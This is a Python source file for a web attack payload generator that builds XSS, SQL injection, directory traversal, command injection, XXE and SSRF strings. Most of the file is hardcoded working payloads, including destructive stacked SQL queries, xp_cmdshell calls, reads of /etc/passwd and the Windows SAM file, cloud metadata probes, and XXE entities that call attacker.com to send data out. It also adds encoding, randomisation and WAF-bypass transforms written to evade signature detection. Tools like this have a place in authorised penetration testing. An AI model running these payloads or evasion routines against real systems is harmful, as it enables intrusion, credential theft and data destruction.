# Dynamic Payload Generator - Halil Berkay Şahin
import base64
import html
import json
import random
import string
import time
import urllib.parse
from dataclasses import dataclass
from enum import Enum


class PayloadType(Enum):
    """Payload types supported by the generator."""

    XSS_REFLECTED = "XSS_REFLECTED"
    XSS_STORED = "XSS_STORED"
    XSS_DOM = "XSS_DOM"
    XSS_POLYGLOT = "XSS_POLYGLOT"
    SQLI_UNION = "SQLI_UNION"
    SQLI_BOOLEAN = "SQLI_BOOLEAN"
    SQLI_TIME = "SQLI_TIME"
    SQLI_ERROR = "SQLI_ERROR"
    SQLI_POLYGLOT = "SQLI_POLYGLOT"
    DIRECTORY_TRAVERSAL = "DIRECTORY_TRAVERSAL"
    COMMAND_INJECTION = "COMMAND_INJECTION"
    XXE = "XXE"
    SSRF = "SSRF"


class EncodingType(Enum):
    """Encoding types for payload obfuscation."""

    NONE = "NONE"
    URL = "URL"
    HTML = "HTML"
    BASE64 = "BASE64"
    HEX = "HEX"
    UNICODE = "UNICODE"
    DOUBLE_URL = "DOUBLE_URL"
    MIXED = "MIXED"


@dataclass
class PayloadConfig:
    """Configuration for payload generation."""

    target_context: str = "parameter"  # parameter, header, cookie, path
    target_technology: str = "generic"  # php, asp, jsp, node, python
    bypass_filters: list[str] = None  # WAF types to bypass
    encoding_preference: EncodingType = EncodingType.NONE
    max_length: int = 1000
    randomize: bool = True
    include_comments: bool = False

    def __post_init__(self):
        if self.bypass_filters is None:
            self.bypass_filters = []


@dataclass
class GeneratedPayload:
    """Structure for generated payloads."""

    payload: str
    payload_type: str
    encoding_used: str
    description: str
    expected_response: str
    confidence: str  # HIGH, MEDIUM, LOW
    risk_level: str  # CRITICAL, HIGH, MEDIUM, LOW
    test_method: str  # GET, POST, PUT, etc.
    detection_patterns: list[str] = None
    bypass_techniques: list[str] = None

    def __post_init__(self):
        if self.detection_patterns is None:
            self.detection_patterns = []
        if self.bypass_techniques is None:
            self.bypass_techniques = []


class PayloadGenerator:
    """Advanced dynamic payload generator with WAF bypass capabilities."""

    def __init__(self, config: PayloadConfig = None):
        """Initialize payload generator."""
        self.config = config or PayloadConfig()

        # Initialize payload templates and patterns
        self._init_xss_payloads()
        self._init_sqli_payloads()
        self._init_other_payloads()
        self._init_encoding_functions()
        self._init_bypass_techniques()

        # Randomization state
        self.random_seed = int(time.time())
        random.seed(self.random_seed)

    def _init_xss_payloads(self):
        """Initialize XSS payload templates."""
        self.xss_payloads = {
            "basic": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                '<video><source onerror="alert(1)">',
                "<audio src=x onerror=alert(1)>",
            ],
            "attribute_based": [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "vbscript:alert(1)",
                "livescript:alert(1)",
            ],
            "filter_bypass": [
                "<sCrIpT>alert(1)</ScRiPt>",
                "<script>ale\\x72t(1)</script>",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
                "<script>alert(String.fromCharCode(49))</script>",
                "<script>alert(/1/)</script>",
                "<script>alert`1`</script>",
                "<script>alert(1/**/)</script>",
                "<script>/**/alert(1)</script>",
            ],
            "waf_bypass": [
                '<script>window["al"+"ert"](1)</script>',
                '<script>top["al"+"ert"](1)</script>',
                "<script>(alert)(1)</script>",
                "<script>a=alert;a(1)</script>",
                '<script>[].constructor.constructor("alert(1)")()</script>',
                "<svg><script>alert(1)</script>",
                "<<script>alert(1)</script>",
                "<script src=data:,alert(1)>",
                "<object data=javascript:alert(1)>",
                "<embed src=javascript:alert(1)>",
            ],
            "polyglot": [
                'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert()//>',
                '"\'>><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>">',
                '<img src="x" onerror="prompt(1)"><script>alert(1)</script><svg onload=confirm(1)>',
            ],
            "dom_based": [
                "#<script>alert(1)</script>",
                "javascript:alert(document.domain)",
                "#javascript:alert(1)",
                "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "data:text/html,<script>alert(1)</script>",
            ],
        }

    def _init_sqli_payloads(self):
        """Initialize SQL injection payload templates."""
        self.sqli_payloads = {
            "union_based": [
                "' UNION SELECT 1,2,3--",
                "' UNION ALL SELECT 1,2,3--",
                "' UNION SELECT null,null,null--",
                "' UNION SELECT 1,version(),3--",
                "' UNION SELECT 1,user(),3--",
                "' UNION SELECT 1,database(),3--",
                "' UNION SELECT 1,@@version,3--",
                "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
                "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns--",
            ],
            "boolean_based": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1--",
                "' OR 1=2--",
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND ascii(substring(version(),1,1))>50--",
                "' AND length(database())>0--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            ],
            "time_based": [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "'; SELECT SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT SLEEP(5))x)--",
                "' UNION SELECT SLEEP(5),null,null--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND (SELECT count(*) FROM pg_sleep(5))>0--",  # PostgreSQL
                "'; DBMS_LOCK.SLEEP(5);--",  # Oracle
            ],
            "error_based": [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND extractvalue(1, concat(0x7e, (select version()), 0x7e))--",
                "' AND updatexml(1,concat(0x7e,version(),0x7e),1)--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND exp(~(SELECT * FROM (SELECT version())x))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ],
            "stacked_queries": [
                "'; INSERT INTO users VALUES ('hacker','password')--",
                "'; UPDATE users SET password='hacked'--",
                "'; DELETE FROM users WHERE id=1--",
                "'; CREATE TABLE temp (data varchar(100))--",
                "'; DROP TABLE temp--",
                "'; EXEC xp_cmdshell('whoami')--",
                "'; SELECT * INTO OUTFILE '/tmp/test.txt'--",
            ],
            "bypass_filters": [
                "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
                "' +UnIoN+SeLeCt+ 1,2,3--",
                "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
                "'/**/UNION/**/SELECT/**/1,2,3--",
                "' UNION(SELECT(1),2,3)--",
                "' UNION%0DSELECT%0D1,2,3--",
                "' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3--",
                "' %55NION %53ELECT 1,2,3--",
            ],
        }

    def _init_other_payloads(self):
        """Initialize other attack payload templates."""
        self.other_payloads = {
            "directory_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "/var/www/../../etc/passwd",
                "C:\\..\\..\\..\\windows\\system32\\config\\sam",
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "& cat /etc/passwd",
                "&& cat /etc/passwd",
                "|| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; whoami",
                "| whoami",
                "& whoami",
            ],
            "xxe": [
                '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
                '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><test>&xxe;</test>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd">%file;]>',
                '<!DOCTYPE test [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><test>&send;</test>',
            ],
            "ssrf": [
                "http://127.0.0.1:80",
                "http://localhost:22",
                "http://169.254.169.254/metadata",
                "http://[::1]:80",
                "http://0.0.0.0:80",
                "file:///etc/passwd",
                "dict://127.0.0.1:11211",
                "gopher://127.0.0.1:6379",
            ],
        }

    def _init_encoding_functions(self):
        """Initialize encoding functions."""
        self.encoders = {
            EncodingType.URL: lambda x: urllib.parse.quote(x, safe=""),
            EncodingType.HTML: lambda x: html.escape(x),
            EncodingType.BASE64: lambda x: base64.b64encode(x.encode()).decode(),
            EncodingType.HEX: lambda x: "".join(f"%{ord(c):02x}" for c in x),
            EncodingType.UNICODE: lambda x: "".join(f"\\u{ord(c):04x}" for c in x),
            EncodingType.DOUBLE_URL: lambda x: urllib.parse.quote(urllib.parse.quote(x, safe=""), safe=""),
        }

    def _init_bypass_techniques(self):
        """Initialize WAF bypass techniques."""
        self.bypass_techniques = {
            "case_variation": lambda x: "".join(c.upper() if random.choice([True, False]) else c.lower() for c in x),
            "comment_insertion": lambda x: x.replace(" ", "/**/ "),
            "encoding_variation": lambda x: x.replace("=", "%3D").replace(" ", "%20"),
            "null_byte": lambda x: x + "%00",
            "newline_injection": lambda x: x.replace(" ", "%0A"),
            "tab_injection": lambda x: x.replace(" ", "%09"),
            "concatenation": lambda x: x.replace("alert", "ale" + "rt") if "alert" in x else x,
        }

    def generate_xss_payloads(self, count: int = 10, target_context: str = "parameter") -> list[GeneratedPayload]:
        """Generate XSS payloads based on configuration."""
        payloads = []
        payload_pool = []

        # Select appropriate payload categories
        if target_context == "attribute":
            payload_pool.extend(self.xss_payloads["attribute_based"])
        else:
            payload_pool.extend(self.xss_payloads["basic"])
            payload_pool.extend(self.xss_payloads["filter_bypass"])

        # Add WAF bypass payloads if needed
        if self.config.bypass_filters:
            payload_pool.extend(self.xss_payloads["waf_bypass"])

        # Add polyglot payloads for comprehensive testing
        payload_pool.extend(self.xss_payloads["polyglot"][:2])  # Limit polyglots

        # Generate requested number of payloads
        selected_payloads = random.sample(payload_pool, min(count, len(payload_pool)))

        for base_payload in selected_payloads:
            # Apply randomization if enabled
            if self.config.randomize:
                payload = self._randomize_payload(base_payload)
            else:
                payload = base_payload

            # Apply encoding if specified
            if self.config.encoding_preference != EncodingType.NONE:
                encoded_payload = self._encode_payload(payload, self.config.encoding_preference)
            else:
                encoded_payload = payload

            # Apply bypass techniques if needed
            if self.config.bypass_filters:
                encoded_payload = self._apply_bypass_techniques(encoded_payload)

            # Check length constraint
            if len(encoded_payload) > self.config.max_length:
                continue

            # Create payload object
            generated_payload = GeneratedPayload(
                payload=encoded_payload,
                payload_type=PayloadType.XSS_REFLECTED.value,
                encoding_used=self.config.encoding_preference.value,
                description=f"XSS payload for {target_context} context",
                expected_response="JavaScript execution or alert dialog",
                confidence="MEDIUM",
                risk_level="HIGH",
                test_method="GET",
                detection_patterns=self._get_xss_detection_patterns(encoded_payload),
                bypass_techniques=self.config.bypass_filters,
            )

            payloads.append(generated_payload)

        return payloads

    def generate_sqli_payloads(self, count: int = 10, database_type: str = "mysql") -> list[GeneratedPayload]:
        """Generate SQL injection payloads."""
        payloads = []
        payload_pool = []

        # Select payloads based on database type
        payload_pool.extend(self.sqli_payloads["union_based"])
        payload_pool.extend(self.sqli_payloads["boolean_based"])
        payload_pool.extend(self.sqli_payloads["error_based"])

        # Add time-based payloads with appropriate syntax
        if database_type.lower() == "mysql":
            payload_pool.extend([p for p in self.sqli_payloads["time_based"] if "SLEEP" in p])
        elif database_type.lower() == "postgresql":
            payload_pool.extend([p for p in self.sqli_payloads["time_based"] if "pg_sleep" in p])
        elif database_type.lower() == "mssql":
            payload_pool.extend([p for p in self.sqli_payloads["time_based"] if "WAITFOR" in p])
        else:
            payload_pool.extend(self.sqli_payloads["time_based"][:3])  # Generic time-based

        # Add bypass payloads if filters are specified
        if self.config.bypass_filters:
            payload_pool.extend(self.sqli_payloads["bypass_filters"])

        # Generate payloads
        selected_payloads = random.sample(payload_pool, min(count, len(payload_pool)))

        for base_payload in selected_payloads:
            # Apply randomization
            if self.config.randomize:
                payload = self._randomize_sqli_payload(base_payload)
            else:
                payload = base_payload

            # Apply encoding
            if self.config.encoding_preference != EncodingType.NONE:
                encoded_payload = self._encode_payload(payload, self.config.encoding_preference)
            else:
                encoded_payload = payload

            # Apply bypass techniques
            if self.config.bypass_filters:
                encoded_payload = self._apply_sqli_bypass_techniques(encoded_payload)

            # Determine payload type
            if "UNION" in payload.upper():
                payload_type = PayloadType.SQLI_UNION.value
            elif "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                payload_type = PayloadType.SQLI_TIME.value
            elif "AND" in payload.upper() or "OR" in payload.upper():
                payload_type = PayloadType.SQLI_BOOLEAN.value
            else:
                payload_type = PayloadType.SQLI_ERROR.value

            generated_payload = GeneratedPayload(
                payload=encoded_payload,
                payload_type=payload_type,
                encoding_used=self.config.encoding_preference.value,
                description=f"SQL injection payload for {database_type} database",
                expected_response=self._get_sqli_expected_response(payload_type),
                confidence="HIGH",
                risk_level="CRITICAL",
                test_method="POST",
                detection_patterns=self._get_sqli_detection_patterns(encoded_payload),
                bypass_techniques=self.config.bypass_filters,
            )

            payloads.append(generated_payload)

        return payloads

    def generate_custom_payload(
        self, payload_type: PayloadType, template: str = None, variables: dict = None
    ) -> GeneratedPayload:
        """Generate custom payload with template substitution."""
        if variables is None:
            variables = {}

        if template is None:
            # Select default template based on type
            if payload_type == PayloadType.XSS_REFLECTED:
                template = "<script>alert('{value}')</script>"
            elif payload_type == PayloadType.SQLI_UNION:
                template = "' UNION SELECT {columns}--"
            else:
                template = "{payload}"

        # Default variables
        default_vars = {
            "value": self._generate_random_string(8),
            "columns": "1,2,3",
            "payload": "test",
            "callback_url": "http://attacker.com",
            "random_num": str(random.randint(1000, 9999)),
        }

        # Merge with provided variables
        final_vars = {**default_vars, **variables}

        # Substitute variables in template
        try:
            payload = template.format(**final_vars)
        except KeyError as e:
            # Handle missing variables
            payload = template.replace(f"{{{e.args[0]}}}", "undefined")

        # Apply standard processing
        if self.config.randomize:
            payload = self._randomize_payload(payload)

        if self.config.encoding_preference != EncodingType.NONE:
            payload = self._encode_payload(payload, self.config.encoding_preference)

        return GeneratedPayload(
            payload=payload,
            payload_type=payload_type.value,
            encoding_used=self.config.encoding_preference.value,
            description=f"Custom {payload_type.value} payload",
            expected_response="Variable response based on payload type",
            confidence="MEDIUM",
            risk_level="HIGH",
            test_method="GET",
            detection_patterns=[],
            bypass_techniques=[],
        )

    def _randomize_payload(self, payload: str) -> str:
        """Randomize payload to avoid signature detection."""
        # Replace common values with random ones
        replacements = {
            "alert(1)": f"alert({random.randint(1, 999)})",
            'alert("test")': f'alert("{self._generate_random_string(6)}")',
            "SELECT 1,2,3": f"SELECT {random.randint(1,9)},{random.randint(1,9)},{random.randint(1,9)}",
            "SLEEP(5)": f"SLEEP({random.randint(3,10)})",
            "passwd": random.choice(["passwd", "shadow", "hosts"]),
            "etc": random.choice(["etc", "var", "tmp"]),
        }

        for old, new in replacements.items():
            payload = payload.replace(old, new)

        return payload

    def _randomize_sqli_payload(self, payload: str) -> str:
        """Randomize SQL injection specific elements."""
        # Add random comments
        if random.choice([True, False]):
            payload = payload.replace("--", f"-- {self._generate_random_string(5)}")

        # Randomize spaces
        if random.choice([True, False]):
            payload = payload.replace(" ", random.choice([" ", "/**/", "+"]))

        return payload

    def _encode_payload(self, payload: str, encoding: EncodingType) -> str:
        """Apply encoding to payload."""
        if encoding == EncodingType.NONE:
            return payload
        elif encoding == EncodingType.MIXED:
            # Apply random mix of encodings to different parts
            encoded = payload
            for i in range(0, len(payload), 3):
                part = payload[i : i + 3]
                random_encoding = random.choice([EncodingType.URL, EncodingType.HEX, EncodingType.UNICODE])
                if random_encoding in self.encoders:
                    encoded = encoded.replace(part, self.encoders[random_encoding](part), 1)
            return encoded
        elif encoding in self.encoders:
            return self.encoders[encoding](payload)
        else:
            return payload

    def _apply_bypass_techniques(self, payload: str) -> str:
        """Apply WAF bypass techniques."""
        modified_payload = payload

        # Apply random bypass techniques
        techniques = random.sample(list(self.bypass_techniques.keys()), min(2, len(self.bypass_techniques)))

        for technique in techniques:
            if technique in self.bypass_techniques:
                modified_payload = self.bypass_techniques[technique](modified_payload)

        return modified_payload

    def _apply_sqli_bypass_techniques(self, payload: str) -> str:
        """Apply SQL injection specific bypass techniques."""
        # SQL-specific bypasses
        sql_bypasses = [
            lambda x: x.replace("UNION", "UNION/**/"),
            lambda x: x.replace("SELECT", "SELECT/**/"),
            lambda x: x.replace(" ", "/**/"),
            lambda x: x.replace("=", "LIKE"),
            lambda x: x.replace("AND", "AND/**/"),
            lambda x: x.replace("OR", "OR/**/"),
        ]

        # Apply random SQL bypasses
        for bypass in random.sample(sql_bypasses, min(2, len(sql_bypasses))):
            payload = bypass(payload)

        return payload

    def _generate_random_string(self, length: int) -> str:
        """Generate random string for payload randomization."""
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def _get_xss_detection_patterns(self, payload: str) -> list[str]:
        """Get detection patterns for XSS payloads."""
        patterns = []

        if "alert" in payload.lower():
            patterns.append("alert dialog")
        if "script" in payload.lower():
            patterns.append("<script> tag in response")
        if "onerror" in payload.lower():
            patterns.append("onerror event handler")
        if "onload" in payload.lower():
            patterns.append("onload event handler")

        return patterns

    def _get_sqli_detection_patterns(self, payload: str) -> list[str]:
        """Get detection patterns for SQL injection payloads."""
        patterns = []

        if "UNION" in payload.upper():
            patterns.append("Additional columns in response")
        if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
            patterns.append("Response delay of 3+ seconds")
        if "AND" in payload.upper() or "OR" in payload.upper():
            patterns.append("Different response for true/false conditions")
        if "version()" in payload.lower():
            patterns.append("Database version in response")

        return patterns

    def _get_sqli_expected_response(self, payload_type: str) -> str:
        """Get expected response for SQL injection payload types."""
        responses = {
            PayloadType.SQLI_UNION.value: "Additional data columns or database information",
            PayloadType.SQLI_TIME.value: "Response delay indicating time-based injection",
            PayloadType.SQLI_BOOLEAN.value: "Different response for true/false conditions",
            PayloadType.SQLI_ERROR.value: "Database error messages revealing information",
        }
        return responses.get(payload_type, "Varies based on payload type")

    def generate_payload_variants(self, base_payload: str, count: int = 5) -> list[GeneratedPayload]:
        """Generate multiple variants of a base payload."""
        variants = []

        for i in range(count):
            # Create variant with different encoding and randomization
            variant_config = PayloadConfig(
                encoding_preference=random.choice(list(EncodingType)),
                randomize=True,
                bypass_filters=random.sample(["cloudflare", "akamai", "waf"], random.randint(0, 2)),
            )

            # Temporarily update config
            original_config = self.config
            self.config = variant_config

            # Generate variant
            if "script" in base_payload.lower() or "alert" in base_payload.lower():
                payload_type = PayloadType.XSS_REFLECTED
            elif "union" in base_payload.lower() or "select" in base_payload.lower():
                payload_type = PayloadType.SQLI_UNION
            else:
                payload_type = PayloadType.XSS_REFLECTED

            variant = self.generate_custom_payload(payload_type, base_payload, {"variant": str(i + 1)})
            variants.append(variant)

            # Restore original config
            self.config = original_config

        return variants

    def export_payloads_json(self, payloads: list[GeneratedPayload], filename: str = "generated_payloads.json") -> str:
        """Export generated payloads to JSON file."""
        payload_data = []

        for payload in payloads:
            payload_dict = {
                "payload": payload.payload,
                "type": payload.payload_type,
                "encoding": payload.encoding_used,
                "description": payload.description,
                "expected_response": payload.expected_response,
                "confidence": payload.confidence,
                "risk_level": payload.risk_level,
                "test_method": payload.test_method,
                "detection_patterns": payload.detection_patterns,
                "bypass_techniques": payload.bypass_techniques,
            }
            payload_data.append(payload_dict)

        export_data = {
            "generator_version": "1.0",
            "generation_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_payloads": len(payloads),
            "configuration": {
                "target_context": self.config.target_context,
                "target_technology": self.config.target_technology,
                "encoding_preference": self.config.encoding_preference.value,
                "randomize": self.config.randomize,
            },
            "payloads": payload_data,
        }

        try:
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            return filename
        except Exception as e:
            print(f"Failed to export payloads: {e}")
            return ""


# Convenience functions
def quick_xss_payloads(count: int = 5, encoding: str = "none") -> list[GeneratedPayload]:
    """Quick XSS payload generation."""
    config = PayloadConfig(
        encoding_preference=(
            EncodingType(encoding.upper()) if encoding.upper() in [e.value for e in EncodingType] else EncodingType.NONE
        )
    )
    generator = PayloadGenerator(config)
    return generator.generate_xss_payloads(count)


def quick_sqli_payloads(count: int = 5, database: str = "mysql") -> list[GeneratedPayload]:
    """Quick SQL injection payload generation."""
    generator = PayloadGenerator()
    return generator.generate_sqli_payloads(count, database)


def generate_custom_payload_set(payload_types: list[str], count_per_type: int = 3) -> dict[str, list[GeneratedPayload]]:
    """Generate custom set of payloads for multiple types."""
    generator = PayloadGenerator()
    results = {}

    for ptype in payload_types:
        try:
            payload_type_enum = PayloadType(ptype.upper())
            if "XSS" in ptype.upper():
                results[ptype] = generator.generate_xss_payloads(count_per_type)
            elif "SQL" in ptype.upper():
                results[ptype] = generator.generate_sqli_payloads(count_per_type)
            else:
                # Generate custom payload for other types
                results[ptype] = [generator.generate_custom_payload(payload_type_enum) for _ in range(count_per_type)]
        except ValueError:
            print(f"Unknown payload type: {ptype}")
            continue

    return results
